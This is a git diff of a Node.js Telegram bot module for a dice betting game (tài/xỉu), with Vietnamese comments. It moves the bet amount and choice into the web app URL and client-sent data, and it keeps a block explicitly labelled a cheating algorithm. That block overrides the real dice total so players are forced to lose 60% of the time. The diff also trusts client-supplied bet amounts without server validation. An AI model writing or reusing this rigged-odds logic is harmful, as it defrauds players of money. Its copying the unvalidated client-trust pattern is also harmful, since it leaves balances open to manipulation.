@@ -73,17 +73,13 @@ module.exports = (bot) => {
         }
 
         const choice = ctx.session.betChoice;
-        
-        // Lưu tạm thông tin cược vào session
-        ctx.session.finalAmount = amount;
-        ctx.session.finalChoice = choice;
-        // Xóa betChoice để không bị lặp lại
         ctx.session.betChoice = null;
 
         // ═══════════════════════════════════════
-        // 5. GỬI NÚT MỞ WEB APP XÚC XẮC (DÙNG REPLY KEYBOARD)
+        // 5. GỬI NÚT MỞ WEB APP XÚC XẮC (TRUYỀN DATA QUA URL)
         // ═══════════════════════════════════════
-        const webAppUrl = `https://telegram-shop-bot-696z.onrender.com/dice.html`;
+        // Truyền số tiền và lựa chọn vào URL để không bị mất session
+        const webAppUrl = `https://telegram-shop-bot-696z.onrender.com/dice.html?amount=${amount}&choice=${choice}`;
 
         await ctx.replyWithHTML(
             `🎲 <b>Đã nhận cược ${formatPrice(amount)}</b>\n\n` +
@@ -95,53 +91,41 @@ module.exports = (bot) => {
     });
 
     // ═══════════════════════════════════════
-    // 6. NHẬN KẾT QUẢ TỪ WEB APP (CHỈ XỬ LÝ KHI BẤM XÚC XẮC XONG)
+    // 6. NHẬN KẾT QUẢ TỪ WEB APP
     // ═══════════════════════════════════════
     bot.on('web_app_data', async (ctx) => {
         try {
-            if (!ctx.session || !ctx.session.finalAmount) {
-                return ctx.reply('❌ Không tìm thấy thông tin cược. Vui lòng chơi lại.', Markup.removeKeyboard());
-            }
-
-            // SỬA LỖI TẠI ĐÂY: Kiểm tra nếu là string thì parse, nếu là object thì dùng luôn
             const rawData = ctx.webAppData.data;
             const data = typeof rawData === 'string' ? JSON.parse(rawData) : rawData;
             
-            const amount = Number(ctx.session.finalAmount);
-            const choice = ctx.session.finalChoice;
+            // Lấy thông tin từ Web App gửi về
+            const amount = Number(data.amount);
+            const choice = data.choice;
 
-            // Xóa session sau khi xử lý xong và xóa bàn phím
-            delete ctx.session.finalAmount;
-            delete ctx.session.finalChoice;
-            
+            if (!amount || !choice) {
+                return ctx.reply('❌ Lỗi dữ liệu cược. Vui lòng chơi lại.', Markup.removeKeyboard());
+            }
+
             // Xóa nút Lắc Xúc Xắc
             await ctx.reply('Đang xử lý kết quả...', Markup.removeKeyboard());
 
             // ═══════════════════════════════════════
-            // THUẬT TOÁN GIAN LẬN DỰA TRÊN KẾT QUẢ THẬT
+            // 7. THUẬT TOÁN GIAN LẬN DỰA TRÊN KẾT QUẢ THẬT
             // ═══════════════════════════════════════
             let finalTotal = data.total;
             
-            // 60% ép thua (Bạn có thể đổi số 0.6 này)
+            // 60% ép thua
             const isForcedLose = Math.random() < 0.6; 
 
             if (isForcedLose) {
-                // Nếu kết quả thật đang là kết quả người chơi chọn -> Ép thành ngược lại
                 if ((choice === 'tai' && finalTotal >= 11) || (choice === 'xiu' && finalTotal < 11)) {
-                    if (choice === 'tai') {
-                        finalTotal = Math.floor(Math.random() * 8) + 3; // 3-10 (Xỉu)
-                    } else {
-                        finalTotal = Math.floor(Math.random() * 8) + 11; // 11-18 (Tài)
-                    }
+                    if (choice === 'tai') finalTotal = Math.floor(Math.random() * 8) + 3; 
+                    else finalTotal = Math.floor(Math.random() * 8) + 11; 
                 }
             } else {
-                // Nếu kết quả thật đang ngược với người chơi chọn -> Ép thành kết quả người chơi chọn (để họ thắng)
                 if ((choice === 'tai' && finalTotal < 11) || (choice === 'xiu' && finalTotal >= 11)) {
-                    if (choice === 'tai') {
-                        finalTotal = Math.floor(Math.random() * 8) + 11; // 11-18 (Tài)
-                    } else {
-                        finalTotal = Math.floor(Math.random() * 8) + 3; // 3-10 (Xỉu)
-                    }
+                    if (choice === 'tai') finalTotal = Math.floor(Math.random() * 8) + 11; 
+                    else finalTotal = Math.floor(Math.random() * 8) + 3; 
                 }
             }
 
@@ -162,14 +146,11 @@ module.exports = (bot) => {
                 `🔢 Tổng điểm: <b>${finalTotal}</b> => <b>${resultName}</b>\n\n` +
                 `Bạn đã cược: <b>${choiceName}</b> (${formatPrice(amount)})\n`;
 
-            // Trừ tiền cược
             await userService.deductBalance(ctx.from.id, amount);
             
-            // Kiểm tra thắng thua
             const isWin = (choice === 'tai' && finalTotal >= 11) || (choice === 'xiu' && finalTotal < 11);
 
             if (isWin) {
-                // THẮNG
                 const winnings = amount; 
                 await userService.addBalance(ctx.from.id, amount + winnings); 
                 const updatedUser = await userService.get(ctx.from.id);
@@ -193,7 +174,6 @@ module.exports = (bot) => {
                 } catch (e) { console.error(e); }
 
             } else {
-                // THUA
                 const updatedUser = await userService.get(ctx.from.id);
                 const newBalance = Number(updatedUser.balance);
                 
@@ -215,7 +195,6 @@ module.exports = (bot) => {
                 } catch (e) { console.error(e); }
             }
 
-            // Gửi lại menu chơi
             ctx.reply('Chơi tiếp?', productListKeyboard([]));
 
         } catch (error) {
